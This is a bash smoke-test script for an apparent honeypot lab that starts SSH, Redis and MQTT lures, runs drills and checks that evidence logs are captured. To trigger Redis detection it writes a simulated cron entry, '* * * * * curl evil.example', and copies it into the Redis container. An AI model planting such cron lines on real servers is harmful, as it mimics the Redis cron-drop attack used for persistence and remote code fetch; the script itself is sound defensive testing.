#!/usr/bin/env bash
# Stage-5 Wave A smoke — SSH, Redis, MQTT on lab published ports (Darwin/Linux).
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT"

EVID="${AMBER_EVIDENCE_ROOT:-$ROOT/.ambercell-wave-a-smoke}"

pick_free_port() {
  local start=$1
  python3 - "$start" <<'PY'
import socket, sys
start = int(sys.argv[1])
for port in range(start, start + 32):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind(("127.0.0.1", port))
        s.close()
        print(port)
        sys.exit(0)
    except OSError:
        continue
print(start)
PY
}

export AMBER_EVIDENCE_ROOT="$EVID"
export AMBER_ROOT="$ROOT"
export COMPOSE_PROFILES="${COMPOSE_PROFILES:-lab,core,wave-a}"
export AMBER_SSH_HOST_PORT="${AMBER_SSH_HOST_PORT:-$(pick_free_port 2222)}"
export AMBER_REDIS_HOST_PORT="${AMBER_REDIS_HOST_PORT:-$(pick_free_port 6380)}"
export AMBER_MQTT_HOST_PORT="${AMBER_MQTT_HOST_PORT:-$(pick_free_port 18830)}"
echo "==> lab ports ssh=$AMBER_SSH_HOST_PORT redis=$AMBER_REDIS_HOST_PORT mqtt=$AMBER_MQTT_HOST_PORT"

COMPOSE_FILES=(-f "$ROOT/compose.yaml" -f "$ROOT/compose.lab.yaml")

AMBERCTL_BIN="${AMBERCTL_BIN:-}"
if [[ -z "$AMBERCTL_BIN" ]]; then
  (cd "$ROOT/amberctl" && go build -o amberctl .)
  AMBERCTL_BIN="$ROOT/amberctl/amberctl"
fi

cleanup() {
  set +e
  for svc in mqtt redis ssh; do
    "$AMBERCTL_BIN" down "$svc" 2>/dev/null || true
  done
}
trap cleanup EXIT

rm -rf "$EVID"
# Release lab ports from prior runs.
for svc in mqtt redis ssh; do
  "$AMBERCTL_BIN" down "$svc" 2>/dev/null || true
done
docker compose "${COMPOSE_FILES[@]}" --profile wave-a down --remove-orphans 2>/dev/null || true

"$AMBERCTL_BIN" init

for svc in ssh redis mqtt; do
  echo "==> up $svc"
  "$AMBERCTL_BIN" up "$svc"
done

sleep 3
"$AMBERCTL_BIN" drill ssh
"$AMBERCTL_BIN" drill redis
"$AMBERCTL_BIN" drill mqtt

# Redis SET + file drop artifact
AMBER_REDIS_HOST_PORT="$AMBER_REDIS_HOST_PORT" python3 - <<'PY'
import os, socket
port = int(os.environ["AMBER_REDIS_HOST_PORT"])
s = socket.create_connection(("127.0.0.1", port), 5)
def cmd(*parts):
    s.sendall(f"*{len(parts)}\r\n".encode())
    for p in parts:
        b = p.encode()
        s.sendall(f"${len(b)}\r\n{b}\r\n".encode())
cmd("SET", "lure:key", "cron_payload")
s.recv(4096)
s.close()
PY

drop_dir="$EVID/../.redis-drop-smoke"
mkdir -p "$drop_dir"
echo "* * * * * curl evil.example" > "$drop_dir/evil.cron"
docker cp "$drop_dir/evil.cron" ambercell-redis-hi:/data/evil.cron 2>/dev/null || true

# MQTT pub (requires mosquitto_pub in PATH or skip)
if command -v mosquitto_pub >/dev/null 2>&1; then
  mosquitto_pub -h 127.0.0.1 -p "${AMBER_MQTT_HOST_PORT}" -t telemetry/lab -m '{"smoke":true}'
else
  echo "SKIP: mosquitto_pub not installed (TCP drill only)"
fi

sleep 5

evidence_nonempty() {
  local base=$1
  for f in "$base" "${base}.active"; do
    if [[ -s "$f" ]]; then
      echo "OK: evidence $f"
      return 0
    fi
  done
  echo "FAIL: missing or empty $base (or .active)" >&2
  return 1
}

fail=0
evidence_nonempty "$EVID/raw-flows/ssh/flows.jsonl" || fail=1
evidence_nonempty "$EVID/raw-flows/redis/flows.jsonl" || fail=1
evidence_nonempty "$EVID/raw-flows/mqtt/flows.jsonl" || fail=1
for f in "$EVID/state/ssh.json" "$EVID/state/redis.json" "$EVID/state/mqtt.json"; do
  if [[ -s "$f" ]]; then echo "OK: evidence $f"; else echo "FAIL: $f" >&2; fail=1; fi
done
# Normalized events: accept redis file_drop or redis.kv from SET drill.
if evidence_nonempty "$EVID/jsonl/redis/events.jsonl"; then :; else fail=1; fi
if ! evidence_nonempty "$EVID/jsonl/ssh/events.jsonl"; then
  echo "NOTE: ssh events optional on banner-only drill (raw flows required)"
fi
if ! evidence_nonempty "$EVID/jsonl/mqtt/events.jsonl"; then
  echo "NOTE: mqtt events optional without mosquitto_pub (raw flows required)"
fi

if [[ "$fail" -ne 0 ]]; then
  docker compose "${COMPOSE_FILES[@]}" --profile wave-a logs --tail=40 ssh-collector redis-collector mqtt-collector || true
  exit 1
fi

echo "==> Wave A smoke PASS (lab; G1–G11 not claimed on Darwin)"
